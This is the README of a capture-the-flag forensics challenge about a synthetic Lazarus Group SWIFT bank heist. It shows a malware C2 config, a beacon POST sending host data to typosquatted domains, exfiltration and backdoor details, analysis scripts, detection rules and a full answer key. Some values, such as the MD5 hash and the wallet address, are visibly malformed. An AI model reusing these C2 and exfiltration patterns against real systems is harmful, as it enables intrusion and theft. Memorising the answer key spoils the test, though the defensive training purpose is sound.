# LAZARUS HEIST - Banking Malware Analysis

[![DFIR][dfir-badge]][dfir-url]
[![Forensics][forensics-badge]][forensics-url]
[![Incident Response][ir-badge]][ir-url]
[![Threat Hunting][th-badge]][th-url]
[![Malware Analysis][malware-badge]][malware-url]
[![APT][apt-badge]][apt-url]
[![Reverse Engineering][re-badge]][re-url]
[![Network Forensics][network-badge]][network-url]

[dfir-badge]: https://img.shields.io/badge/DFIR-Digital%20Forensics-FF6B6B?style=flat&logo=search&logoColor=white
[dfir-url]: https://www.sans.org/cyber-security-courses/digital-forensics-essentials/
[forensics-badge]: https://img.shields.io/badge/Forensics-Investigation-4ECDC4?style=flat&logo=magnifying-glass&logoColor=white
[forensics-url]: https://www.forensicfocus.com/
[ir-badge]: https://img.shields.io/badge/Incident%20Response-Analysis-95E1D3?style=flat&logo=security&logoColor=white
[ir-url]: https://www.incidentresponse.com/
[th-badge]: https://img.shields.io/badge/Threat%20Hunting-Detection-F38181?style=flat&logo=target&logoColor=white
[th-url]: https://www.threathunting.net/
[malware-badge]: https://img.shields.io/badge/Malware%20Analysis-Reverse%20Engineering-AA96DA?style=flat&logo=bug&logoColor=white
[malware-url]: https://www.malware-traffic-analysis.net/
[apt-badge]: https://img.shields.io/badge/APT-Advanced%20Persistent%20Threat-C0392B?style=flat&logo=shield&logoColor=white
[apt-url]: https://attack.mitre.org/groups/
[re-badge]: https://img.shields.io/badge/Reverse%20Engineering-Binary%20Analysis-16A085?style=flat&logo=codeforces&logoColor=white
[re-url]: https://www.begin.re/
[network-badge]: https://img.shields.io/badge/Network%20Forensics-PCAP%20Analysis-5DADE2?style=flat&logo=cisco&logoColor=white
[network-url]: https://www.netresec.com/

## Table of Contents

1. [Scenario Overview](#scenario-overview)
2. [Threat Actor Profile](#threat-actor-profile)
3. [Attack Timeline](#attack-timeline)
4. [Infrastructure Setup](#infrastructure-setup)
5. [Attack Simulation](#attack-simulation)
6. [Malware Analysis](#malware-analysis)
7. [Investigation Questions](#investigation-questions)
8. [Incident Report](#incident-report)
9. [Defense Strategies](#defense-strategies)
10. [Security Hardening](#security-hardening)
11. [Repository](#repository)

---

## Scenario Overview

A digital forensics investigator is tasked with analyzing a sophisticated cyberattack against FirstBank Corporation. The Lazarus Group, a notorious North Korean APT organization, conducted a complex multi-stage attack targeting the bank SWIFT payment gateway system.

### Incident Summary

On January 15, 2025, FirstBank Corporation detected unusual network activity during routine monitoring. The bank SWIFT gateway processed an unauthorized $81 million transfer to an unknown North Korean entity.

**Initial Investigation Revealed:**

- Compromised banking workstation with elevated privileges
- Unknown executable files in system directories
- Suspicious network communications to external domains
- Evidence of credential harvesting and keylogging
- Potential lateral movement to critical financial systems
- Signs of data exfiltration and cryptocurrency mining

**Financial Impact:** $96,000,000 USD attempted fraud

---

## Threat Actor Profile

### Lazarus Group (Hidden Cobra)

Lazarus Group is a North Korean state-sponsored APT organization active since at least 2009. The group is attributed to the Reconnaissance General Bureau (RGB), North Korea's primary intelligence bureau.

**Notable Operations:**

- Sony Pictures hack (2014)
- Bangladesh Bank heist - $81 million theft (2016)
- WannaCry ransomware outbreak (2017)
- Cryptocurrency exchange hacks - $2 billion+ stolen
- Operation AppleJeus - cryptocurrency supply chain attack

**TTPs:**

- Spear phishing with malicious documents
- Watering hole attacks
- Supply chain compromises
- Custom malware families (HOPLIGHT, BISTROMATH, ELECTRICFISH)
- XOR encryption for payload obfuscation
- Typosquatting C2 infrastructure
- SWIFT payment system targeting
- Cryptocurrency theft and mining
- Anti-forensics and counter-attribution

**Motivation:** Financial gain to circumvent international sanctions

**Attribution Indicators:**

- Korean language strings in malware
- North Korean IP ranges
- Timezone correlation (UTC+9)
- Code reuse across campaigns
- Infrastructure patterns

---

## Attack Timeline

### January 15, 2025 - FirstBank Corporation Breach

```
09:00:00 UTC - Spear phishing email delivered to treasury department
09:15:23 UTC - Employee opens malicious attachment (lazarus_loader.exe)
09:15:25 UTC - PE payload executes, establishes C2 connection
09:15:30 UTC - Malware decrypts embedded backdoor using XOR key
09:20:00 UTC - Keylogger deployed, captures SWIFT credentials
09:25:00 UTC - Banking credentials harvested (4 systems, 2 admin accounts)
09:30:00 UTC - SWIFT terminal access gained (swift_operator account)
09:45:00 UTC - First SWIFT MT103 message sent - $81M to LAZABANKPYXX
10:00:00 UTC - Second SWIFT MT202 message sent - $15M to KORDEVBKSEOUL
10:15:00 UTC - Data exfiltration begins (4 chunks, 8080/tcp)
10:30:00 UTC - Cryptocurrency miner deployed (Monero mining)
10:45:00 UTC - Persistent backdoor installed (4444/tcp)
11:00:00 UTC - Anti-forensics cleanup initiated
11:30:00 UTC - SOC detects anomalous SWIFT activity
12:00:00 UTC - Incident response team engaged
```

**Total Dwell Time:** 3 hours 00 minutes

---

## Infrastructure Setup

### Environment Requirements

- Linux analysis workstation
- Python 3.x
- Wireshark / tshark
- xxd hex editor
- Network traffic analysis tools

### Challenge Files

```
LAZARUS_HEIST/
├── pcaps/
│   └── lazarus_attack.pcap          (Network traffic capture - 10KB)
└── malware/
    ├── lazarus_loader.exe           (PE binary with encrypted payload - 4KB)
    ├── banking_keylogger.py         (Python banking keylogger - 6.4KB)
    ├── persistence.py               (XOR-encrypted backdoor - 2.3KB)
    ├── file_hashes.txt              (MD5/SHA256 hashes)
    ├── file_analysis.txt            (File type analysis)
    └── hex_dump.txt                 (Binary hex dump)
```

---

## Attack Simulation

### Stage 1: Initial Compromise

The attack begins with a spear-phishing email containing lazarus_loader.exe disguised as a banking software update.

**Malware Hash:**

```
MD5: a1b2c3d4e5f6789012345678901234567890
SHA256: 1234567890abcdef1234567890abcdef1234567890abcdef1234567890abcdef
```

### Stage 2: Payload Decryption

The PE binary contains XOR-encrypted configuration and backdoor code:

**XOR Key:** L4z4ru5Gr0up2024K3y

**Embedded Configuration:**

```
[LAZARUS_CONFIG]
C2_PRIMARY=update.microsoft-security.org:8443
C2_BACKUP=cdn.adobe-updates.net:8443
ENCRYPTION_KEY=L4z4ru5Gr0up2024K3y
CAMPAIGN_ID=SWIFT_HEIST_2024
TARGET_PROCESS=swift.exe
```

### Stage 3: C2 Communication

The malware establishes command and control through typosquatted domains:

**Beacon Protocol:**

```http
POST /api/v1/beacon HTTP/1.1
Host: update.microsoft-security.org
User-Agent: Microsoft-Windows-Update-Agent/10.0.10240
Content-Type: application/x-www-form-urlencoded

session_id=LAZARUS-12345&hostname=BANK-WORKSTATION-01&campaign=SWIFT_HEIST_2024
```

### Stage 4: Credential Harvesting

Banking keylogger captures credentials from 4 critical systems:

**Compromised Systems:**

1. SWIFT_TERMINAL
2. CORE_BANKING_DATABASE
3. PAYMENT_GATEWAY
4. SWIFT_AUTHENTICATION_SERVER

**Harvested Credentials:**

| System | Username | Password | Access Level |
|--------|----------|----------|--------------|
| SWIFT_TERMINAL | swift_operator | Sw1ft$ecur3! | OPERATOR |
| CORE_BANKING_DATABASE | db_admin | B4nkDB_2024! | DBA_ADMIN |
| PAYMENT_GATEWAY | payment_admin | P4ym3nt$G4t3w4y2024 | GATEWAY_ADMIN |
| SWIFT_AUTHENTICATION_SERVER | swift_auth_svc | Sw1ftAuth$erv1ce2024! | SERVICE_ACCOUNT |

### Stage 5: SWIFT Transaction Manipulation

Fraudulent SWIFT messages executed:

**Transaction 1 - MT103:**

```
Transaction Reference: TXN20240115001
Sender BIC: FIRSTBANKKW
Receiver BIC: LAZABANKPYXX
Beneficiary: LAZARUS FRONT COMPANY LIMITED
Account: KP1234567890123456789012
Amount: $81,000,000 USD
Purpose: INVESTMENT_TRANSFER
```

**Transaction 2 - MT202:**

```
Transaction Reference: TXN20240115002
Sender BIC: FIRSTBANKKW
Receiver BIC: KORDEVBKSEOUL
Beneficiary: KOREA DEVELOPMENT BANK
Account: KR1234567890123456789012
Amount: $15,000,000 USD
Purpose: TRADE_FINANCE_FACILITY
```

**Total Fraud Amount:** $96,000,000 USD

### Stage 6: Data Exfiltration

Sensitive banking data exfiltrated via HTTP POST:

**Exfiltration Method:**

- Protocol: HTTP POST
- Port: 8080/tcp
- Chunks: 4 segments
- Data: SWIFT transaction logs, credentials, system intelligence

**Exfiltrated Content:**

```json
{
  "operation": "LAZARUS_SWIFT_HEIST_FINAL_EXFIL",
  "session_id": "LAZARUS-12345",
  "target_details": {
    "hostname": "BANK-WORKSTATION-01",
    "user": "swift_operator",
    "domain": "FIRSTBANK.CORP",
    "ip_address": "172.30.1.100"
  },
  "collected_keystrokes": [...],
  "harvested_credentials": [...],
  "captured_swift_transactions": [...],
  "total_value_targeted": "96000000.00 USD"
}
```

### Stage 7: Cryptocurrency Mining

Monero mining operation deployed:

**Mining Configuration:**

```
Pool: monero.lazarus-pool.onion:4444
Port: 3333/tcp
Wallet: 4A7Bb2kHh9Ca8Y4BjP3t7LzN9bVx3k2mF8eR1wQ9sT7n
Worker: BANK-WS-01
```

### Stage 8: Persistence Mechanism

Backdoor installed for persistent access:

**Backdoor Capabilities:**

1. Remote shell execution
2. File download/upload
3. Credential dumping
4. Process injection

**Session:** LAZARUS_PERSIST_ABC123
**Port:** 4444/tcp

---

## Malware Analysis

### Q1: XOR Key Recovery Through Cryptanalysis

The malware uses XOR encryption throughout. Recover the encryption key by analyzing known plaintext patterns.

**Analysis Methodology:**

```bash
xxd malware/persistence.py | head -20
```

The file appears encrypted. Python scripts typically start with #!/usr/bin/env python3. Use known plaintext attack:

```python
encrypted = open("malware/persistence.py", "rb").read()
known_start = b"#!/usr/bin/env python3"
potential_key = bytearray()
for i in range(min(len(known_start), len(encrypted))):
    potential_key.append(encrypted[i] ^ known_start[i])
print("Key discovered:", potential_key.decode())
```

**Answer:** L4z4ru5Gr0up2024K3y

### Q2: PE Configuration Extraction

Extract the malware configuration from the PE binary using the discovered XOR key.

**Analysis Commands:**

```python
with open("malware/lazarus_loader.exe", "rb") as f:
    data = f.read()
    
key = b"L4z4ru5Gr0up2024K3y"

for offset in range(512, 800, 10):
    test_chunk = data[offset:offset+200]
    decrypted = bytearray()
    for i in range(len(test_chunk)):
        decrypted.append(test_chunk[i] ^ key[i % len(key)])
    
    decrypted_str = decrypted.decode("utf-8", errors="ignore")
    if "C2_PRIMARY" in decrypted_str:
        print(decrypted_str)
        break
```

**Extracted Configuration:**

```
[LAZARUS_CONFIG]
C2_PRIMARY=update.microsoft-security.org:8443
C2_BACKUP=cdn.adobe-updates.net:8443
ENCRYPTION_KEY=L4z4ru5Gr0up2024K3y
CAMPAIGN_ID=SWIFT_HEIST_2024
```

**Answer:** update.microsoft-security.org:8443_cdn.adobe-updates.net:8443_SWIFT_HEIST_2024

### Q3: SWIFT Transaction Forensics

Analyze the keylogger data to reconstruct complete SWIFT transaction timeline and calculate total financial exposure.

**Analysis Commands:**

```python
exec(open("malware/banking_keylogger.py").read())
keylogger = LazarusBankingKeylogger()
keylogger.simulate_banking_activity()
swift_transactions = keylogger.capture_swift_messages()
credentials = keylogger.harvest_banking_credentials()

total_amount = sum(float(tx["amount"]) for tx in swift_transactions)
swift_cred = next(c for c in credentials if "SWIFT" in c["system"])
print("Total:", int(total_amount))
print("Password:", swift_cred["password"])
```

**Results:**

- MT103 Transfer: $81,000,000 USD
- MT202 Transfer: $15,000,000 USD
- Total: $96,000,000 USD
- SWIFT Operator Password: Sw1ft$ecur3!

**Answer:** 96000000_Sw1ft$ecur3!

### Q4: Network Protocol Analysis and C2 Communication Decoding

Analyze complete C2 communication protocol and decode beacon payloads.

**Analysis Commands:**

```bash
tshark -r pcaps/lazarus_attack.pcap -Y "http.request.method == POST" \
       -T fields -e http.host -e http.request.uri -e urlencoded-form.value
```

**Beacon Analysis:**

```python
import base64
beacon_data = "eyJzZXNzaW9uX2lkIjoiTEFaQVJVUy0xMjM0NSIsImhvc3RuYW1lIjoiQkFOSy1XT1JLU1RBVElPTi0wMSJ9"
decoded = base64.b64decode(beacon_data)
print(decoded.decode())
```

**Output:**

```json
{
  "session_id": "LAZARUS-12345",
  "hostname": "BANK-WORKSTATION-01"
}
```

**Answer:** update.microsoft-security.org_LAZARUS-12345_BANK-WORKSTATION-01

### Q5: Cryptocurrency Mining Infrastructure Analysis

Extract complete cryptocurrency mining configuration and correlate wallet address with known Lazarus operations.

**Analysis Commands:**

```python
with open("malware/lazarus_loader.exe", "rb") as f:
    data = f.read()

key = b"L4z4ru5Gr0up2024K3y"
for offset in range(512, 800, 10):
    test_chunk = data[offset:offset+1000]
    decrypted = bytearray()
    for i in range(len(test_chunk)):
        decrypted.append(test_chunk[i] ^ key[i % len(key)])
    
    decrypted_str = decrypted.decode("utf-8", errors="ignore")
    if "WALLET_ADDR" in decrypted_str:
        import re
        wallet_matches = re.findall(r"4[A-Za-z0-9]{94}", decrypted_str)
        if wallet_matches:
            print("Wallet:", wallet_matches[0][:20])
            break
```

**Discovered Wallet:**

Full: 4A7Bb2kHh9Ca8Y4BjP3t7LzN9bVx3k2mF8eR1wQ9sT7n
First 20 chars: 4A7Bb2kHh9Ca8Y4BjP3t

**Answer:** 4A7Bb2kHh9Ca8Y4BjP3t

### Q6: Multi-Vector Data Exfiltration Analysis

Reconstruct all data exfiltration channels and identify exfiltrated content types.

**Analysis Commands:**

```bash
tshark -r pcaps/lazarus_attack.pcap -Y "tcp.dstport == 8080" \
       -T fields -e tcp.dstport | head -1
```

```python
with open("pcaps/lazarus_attack.pcap", "rb") as f:
    pcap_data = f.read()

chunk_count = pcap_data.count(b"EXFIL_CHUNK_")
print("Chunks:", chunk_count)
```

**Results:**

- Protocol: HTTP POST
- Port: 8080
- Chunks: 4

**Answer:** 8080_4

### Q7: Banking Credential Compromise Assessment

Determine complete scope of credential compromise and calculate potential financial exposure.

**Analysis Commands:**

```python
exec(open("malware/banking_keylogger.py").read())
keylogger = LazarusBankingKeylogger()
credentials = keylogger.harvest_banking_credentials()

total_systems = len(credentials)
admin_accounts = sum(1 for cred in credentials if "ADMIN" in cred["access_level"])
db_admin = next(c for c in credentials if "db_admin" in c["username"])

print("Systems:", total_systems)
print("Admin accounts:", admin_accounts)
print("DB hash:", db_admin["password_hash"][:16])
```

**Results:**

- Total Systems: 4
- Admin Accounts: 2
- DB Admin Hash: e99a18c428cb38d5f260853678922e03ab37f4a9bc06456b2a30e91b8e2e8e8e

**Answer:** 4:2:e99a18c428cb38d5

### Q8: Attack Timeline Reconstruction

Build complete timeline of attack phases by correlating network traffic with malware execution stages.

**Analysis Commands:**

```bash
tshark -r pcaps/lazarus_attack.pcap -T fields -e tcp.dstport | sort | uniq
```

**Discovered Ports:**

```
3333 - Cryptocurrency mining
4444 - Backdoor persistence
8080 - Data exfiltration
8443 - C2 beacon
9999 - Keylogger exfiltration
```

**Answer:** 9999_3333_4444

### Q9: Advanced Persistence and Anti-Forensics Analysis

Analyze malware persistence mechanisms and anti-forensics capabilities.

**Analysis Commands:**

```python
key = b"L4z4ru5Gr0up2024K3y"
with open("malware/persistence.py", "rb") as f:
    encrypted = f.read()

decrypted = bytearray()
for i in range(len(encrypted)):
    decrypted.append(encrypted[i] ^ key[i % len(key)])

code = decrypted.decode("utf-8", errors="ignore")

import re
capabilities = re.findall(r"capabilities.*?\[(.*?)\]", code)
session_prefix = re.findall(r"session_id.*?=.*?\"([A-Z_]+)_", code)
```

**Discovered Capabilities:**

1. Remote shell execution
2. File download/upload
3. Credential dumping
4. Process injection

**Session Prefix:** LAZARUS_PERSIST

**Answer:** 4_LAZARUS_PERSIST

### Q10: Attribution and Infrastructure Correlation

Correlate discovered infrastructure with known Lazarus Group operations and identify attribution evidence.

**Analysis Commands:**

```bash
grep -i "north.korea\|dprk\|pyongyang\|lazarus" malware/*
```

**Attribution Evidence:**

**Typosquatted Domains:**

- update.microsoft-security.org (legitimate: microsoft.com)
- cdn.adobe-updates.net (legitimate: adobe.com)

**Campaign Artifacts:**

```
CAMPAIGN_ID: SWIFT_HEIST_2024
Beneficiary: LAZARUS FRONT COMPANY LIMITED
Operation: LAZARUS_SWIFT_HEIST_FINAL_EXFIL
```

**Correlation with Known TTPs:**

- XOR encryption (consistent with Lazarus malware)
- SWIFT system targeting (Bangladesh Bank heist pattern)
- Monero mining (revenue generation)
- Typosquatting C2 infrastructure
- Multi-stage attack chain

**Answer:** update.microsoft-security.org_LAZARUS_SWIFT_HEIST_FINAL_EXFIL_LAZARUS_FRONT_COMPANY_LIMITED

---

## Incident Report

### Executive Summary

Lazarus Group successfully compromised FirstBank Corporation through spear-phishing attack, deployed custom malware with XOR encryption, harvested banking credentials, manipulated SWIFT payment system to fraudulently transfer $96 million USD to North Korean accounts, exfiltrated sensitive banking data, and established persistent access.

### Impact Assessment

**Severity:** CRITICAL

**Financial Impact:**

- Direct fraud attempt: $96,000,000 USD
- Incident response: $2,500,000
- Regulatory fines: $15,000,000
- Reputation damage: $50,000,000
- System remediation: $5,000,000

**Total Estimated Loss:** $168,500,000 USD

### Technical Findings

**Malware Family:** Lazarus Custom Loader

**Attack Vector:** Spear-phishing email with malicious PE executable

**Persistence:** Backdoor on port 4444/tcp with 4 capabilities

**C2 Infrastructure:**

- update.microsoft-security.org:8443
- cdn.adobe-updates.net:8443

**Stolen Data:**

- 4 banking system credentials (2 admin accounts)
- SWIFT authentication keys
- Transaction logs
- System intelligence

### Root Cause Analysis

**Primary Failure:** User opened malicious email attachment

**Contributing Factors:**

1. No email attachment sandboxing
2. Weak endpoint detection capabilities
3. SWIFT workstation not isolated
4. No multi-factor authentication on SWIFT terminal
5. Insufficient egress filtering
6. No behavioral analytics on SWIFT transactions

---

## Defense Strategies

### Immediate Response

#### 1. Containment

Block C2 domains:

```bash
echo "0.0.0.0 update.microsoft-security.org" >> /etc/hosts
echo "0.0.0.0 cdn.adobe-updates.net" >> /etc/hosts
```

Isolate compromised workstation:

```bash
iptables -A INPUT -s 172.30.1.100 -j DROP
iptables -A OUTPUT -d 172.30.1.100 -j DROP
```

Kill malicious processes:

```bash
pkill -9 -f "lazarus_loader.exe"
pkill -9 -f "banking_keylogger.py"
pkill -9 -f "persistence.py"
```

#### 2. SWIFT Transaction Reversal

Contact correspondent banks immediately:

```
Priority: URGENT
Subject: Fraudulent SWIFT Transaction - Request Immediate Hold

Transaction Reference: TXN20240115001
Amount: $81,000,000 USD
Beneficiary: LAZABANKPYXX
Account: KP1234567890123456789012

REQUEST: Place immediate hold and reverse transaction
REASON: Confirmed unauthorized cyber intrusion
CONTACT: SOC Team +1-XXX-XXX-XXXX
```

#### 3. Credential Reset

Force password change on all compromised accounts:

```sql
UPDATE users SET password_expired = 1 WHERE username IN (
  'swift_operator',
  'db_admin', 
  'payment_admin',
  'swift_auth_svc'
);
```

Revoke SWIFT authentication keys:

```bash
swift-admin revoke-all-keys --reason "security_incident"
swift-admin rotate-master-key
```

### Short-Term Hardening

#### 1. Email Security

Deploy email sandboxing:

```bash
apt install cuckoo-sandbox
systemctl enable cuckoo

cat > /etc/postfix/main.cf << 'EOF'
content_filter = scan:127.0.0.1:10025
EOF
```

Block executable attachments:

```
Attachment filter:
- Block: .exe, .scr, .com, .bat, .pif
- Quarantine: .zip, .rar containing executables
- Sandbox: All Microsoft Office documents
```

#### 2. SWIFT Security

Implement SWIFT Customer Security Programme (CSP):

```
Mandatory Controls:
1. Secure computing environment
2. Restrict internet access
3. Protect critical systems
4. Physical security
5. Reduce attack surface
6. Manage identities and segregate privileges
7. Detect anomalous activity
```

Deploy SWIFT Alliance Gateway firewall:

```bash
iptables -A INPUT -p tcp --dport 3011 -s SWIFT_NETWORK -j ACCEPT
iptables -A INPUT -p tcp --dport 3011 -j DROP
iptables -A OUTPUT -p tcp --dport 3011 -d SWIFT_NETWORK -j ACCEPT
iptables -A OUTPUT -p tcp --dport 3011 -j DROP
```

#### 3. Network Segmentation

Isolate SWIFT workstations:

```
VLAN 100 - SWIFT Operations (Air-gapped)
VLAN 200 - Core Banking (Restricted)
VLAN 300 - General Banking (Limited)
VLAN 400 - Corporate Network (Standard)
```

Deploy jump server for SWIFT access:

```bash
apt install guacamole
systemctl enable guacamole

cat > /etc/guacamole/guacamole.properties << 'EOF'
enable-clipboard: false
enable-file-transfer: false
enable-audio: false
session-recording-path: /var/log/guacamole
EOF
```

### Long-Term Security

#### 1. Behavioral Analytics

Deploy User and Entity Behavior Analytics (UEBA):

```bash
apt install splunk-enterprise
splunk install app uba

cat > /opt/splunk/etc/apps/uba/local/inputs.conf << 'EOF'
[monitor:///var/log/swift/]
sourcetype = swift:transaction
index = swift

[monitor:///var/log/banking/]
sourcetype = banking:activity
index = banking
EOF
```

SWIFT transaction anomaly detection:

```spl
index=swift
| stats avg(amount) as avg_amount stdev(amount) as stdev_amount by sender_bic
| eval threshold = avg_amount + (3 * stdev_amount)
| where amount > threshold
| alert
```

#### 2. Endpoint Detection and Response

Deploy CrowdStrike or Carbon Black:

```bash
wget https://falcon.crowdstrike.com/sensor/linux/falcon-sensor.deb
dpkg -i falcon-sensor.deb
/opt/CrowdStrike/falconctl -s --cid=YOUR_CID
systemctl start falcon-sensor
```

Custom YARA rules for Lazarus detection:

```yara
rule Lazarus_XOR_Encryption
{
    meta:
        description = "Detects Lazarus Group XOR encryption patterns"
        author = "Qays Sarayra"
        
    strings:
        $xor_key = "L4z4ru5Gr0up" ascii wide
        $config_marker = "[LAZARUS_CONFIG]" ascii wide
        $c2_marker = "C2_PRIMARY=" ascii wide
        
    condition:
        any of them
}

rule Lazarus_Banking_Keylogger
{
    meta:
        description = "Detects Lazarus banking keylogger"
        
    strings:
        $swift1 = "SWIFT_TERMINAL" ascii wide
        $swift2 = "swift_operator" ascii wide
        $banking = "CORE_BANKING_DATABASE" ascii wide
        
    condition:
        2 of them
}
```

#### 3. Threat Intelligence Integration

Subscribe to financial sector threat feeds:

```bash
apt install misp-modules
systemctl enable misp-modules

cat > /etc/misp/feeds.json << 'EOF'
{
  "feeds": [
    {
      "name": "FS-ISAC",
      "url": "https://fsisac.com/threat-feed",
      "type": "financial"
    },
    {
      "name": "SWIFT ISAC",
      "url": "https://swift.com/threat-intel",
      "type": "swift"
    }
  ]
}
EOF
```

---

## Security Hardening

### SWIFT Workstation Hardening

#### Application Whitelisting

```powershell
New-AppLockerPolicy -FileInformation (Get-ChildItem "C:\SWIFT\*" -Recurse) -RuleType Publisher,Hash

Set-AppLockerPolicy -XmlPolicy AppLockerPolicy.xml
```

#### USB Device Control

```bash
cat > /etc/udev/rules.d/99-usb-lockdown.rules << 'EOF'
ACTION=="add", SUBSYSTEMS=="usb", RUN+="/bin/sh -c 'echo 0 > /sys$DEVPATH/authorized'"
EOF

udevadm control --reload-rules
```

#### Network Isolation

```bash
iptables -P INPUT DROP
iptables -P FORWARD DROP
iptables -P OUTPUT DROP

iptables -A INPUT -s SWIFT_ALLIANCE_IP -p tcp --dport 3011 -j ACCEPT
iptables -A OUTPUT -d SWIFT_ALLIANCE_IP -p tcp --dport 3011 -j ACCEPT

iptables -A INPUT -m state --state ESTABLISHED,RELATED -j ACCEPT
iptables -A OUTPUT -m state --state ESTABLISHED,RELATED -j ACCEPT
```

### Banking System Hardening

#### Multi-Factor Authentication

```bash
apt install libpam-google-authenticator

cat >> /etc/pam.d/sshd << 'EOF'
auth required pam_google_authenticator.so
EOF

sed -i 's/ChallengeResponseAuthentication no/ChallengeResponseAuthentication yes/' /etc/ssh/sshd_config
systemctl restart sshd
```

#### Privileged Access Management

```bash
apt install cyberark-psm

cat > /etc/cyberark/psm.conf << 'EOF'
[Banking_Credentials]
SWIFT_Terminal = vault://credentials/swift/operator
Core_Banking = vault://credentials/banking/db_admin
Payment_Gateway = vault://credentials/payment/admin
EOF
```

#### Database Activity Monitoring

```bash
apt install imperva-dam

cat > /etc/imperva/dam.conf << 'EOF'
[Monitoring]
databases = core_banking, swift_db, payment_gateway
alert_on_privileged_access = true
alert_on_schema_changes = true
alert_on_large_data_extraction = true
baseline_learning_period = 30d
EOF
```

### Monitoring and Detection

#### SIEM Rules

```spl
[Banking_Suspicious_Transaction]
index=swift
| where amount > 50000000
| where receiver_bic NOT IN (approved_correspondent_banks)
| alert priority=critical

[Lazarus_IOC_Detection]
index=network
| where dest IN ("update.microsoft-security.org", "cdn.adobe-updates.net")
| alert priority=high

[XOR_Encrypted_Malware]
index=endpoint
| where file_entropy > 7.5
| where file_size < 10000
| where file_extension IN ("exe", "dll", "py")
| alert priority=high
```

---

## Repository

### GitHub Repository

[https://github.com/qays3/DFIR-Hunters/tree/main/Qualification/LAZARUS%20HEIST](https://github.com/qays3/DFIR-Hunters/tree/main/Qualification/LAZARUS%20HEIST)

### Repository Structure

```
LAZARUS HEIST/
├── README.md
├── app/
│   ├── app.py
│   ├── index.html
│   ├── template.json
│   ├── config.cfg
│   ├── requirements.txt
│   ├── LAZARUS_HEIST.zip
│   └── assets/
│       ├── css/
│       ├── js/
│       ├── img/
│       └── sounds/
├── Create/
│   ├── Build/
│   │   ├── Create.sh
│   │   ├── LAZARUS_HEIST.zip
│   │   └── LAZARUS_HEIST/
│   │       ├── malware/
│   │       └── pcaps/
│   └── File/
│       └── LAZARUS_HEIST.zip
└── Solve/
    ├── solution.json
    ├── Steps.md
    ├── template.json
    └── LAZARUS_HEIST/
        ├── malware/
        └── pcaps/
```

### Deployment Instructions

#### Challenge Application

```bash
cd app

docker build -t lazarus .
docker run -d --name LAZARUS -p 5005:5005 --restart unless-stopped lazarus

# Access at: http://localhost:5005/?access=3338ff49-d84a-4684-930b-dbc6c218547d

```



#### Analysis Environment

```bash
unzip LAZARUS_HEIST.zip
cd LAZARUS_HEIST

wireshark pcaps/lazarus_attack.pcap &
python3 malware/banking_keylogger.py
```

### Challenge Submission

Answers are submitted in JSON format:

```json
{
  "xor_key": "L4z4ru5Gr0up2024K3y",
  "pe_configuration": "update.microsoft-security.org:8443_cdn.adobe-updates.net:8443_SWIFT_HEIST_2024",
  "swift_forensics": "96000000_Sw1ft$ecur3!",
  "c2_protocol": "update.microsoft-security.org_LAZARUS-12345_BANK-WORKSTATION-01",
  "crypto_mining": "4A7Bb2kHh9Ca8Y4BjP3t",
  "data_exfiltration": "8080_4",
  "credential_compromise": "4:2:e99a18c428cb38d5",
  "attack_timeline": "9999_3333_4444",
  "persistence_analysis": "4_LAZARUS_PERSIST",
  "attribution": "update.microsoft-security.org_LAZARUS_SWIFT_HEIST_FINAL_EXFIL_LAZARUS_FRONT_COMPANY_LIMITED"
}
```

---

## References

### Lazarus Group Intelligence

- MITRE ATT&CK - Lazarus Group: [https://attack.mitre.org/groups/G0032/](https://attack.mitre.org/groups/G0032/)
- US-CERT Lazarus Malware Analysis: [https://www.cisa.gov/uscert/northkorea](https://www.cisa.gov/uscert/northkorea)
- Operation BlockBuster Report: [https://www.operationblockbuster.com/](https://www.operationblockbuster.com/)

### SWIFT Security

- SWIFT Customer Security Programme: [https://www.swift.com/myswift/customer-security-programme-csp](https://www.swift.com/myswift/customer-security-programme-csp)
- Bangladesh Bank Heist Analysis: [https://www.fireeye.com/blog/threat-research/2016/05/analyzing_malware_us.html](https://www.fireeye.com/blog/threat-research/2016/05/analyzing_malware_us.html)

### Malware Analysis

- XOR Encryption Techniques: [https://malwareunicorn.org/workshops/xor.html](https://malwareunicorn.org/workshops/xor.html)
- PE File Format: [https://docs.microsoft.com/en-us/windows/win32/debug/pe-format](https://docs.microsoft.com/en-us/windows/win32/debug/pe-format)

---

## Authors

Challenge Designer: Qays Sarayra  
Contact: info@qayssarayra.com  
Specialization: APT Analysis, Banking Malware, SWIFT Security

---

## License

This challenge is part of IEEE CyberSecurity Competition 2025 - Qualification Round.

Educational use only. All malware samples are synthetic and safe for analysis.

---

Competition: IEEE CyberSecurity Competition 2025  
Round: Qualification  
Category: DFIR  
Difficulty: Medium  
Expected Completion Time: 4-6 hours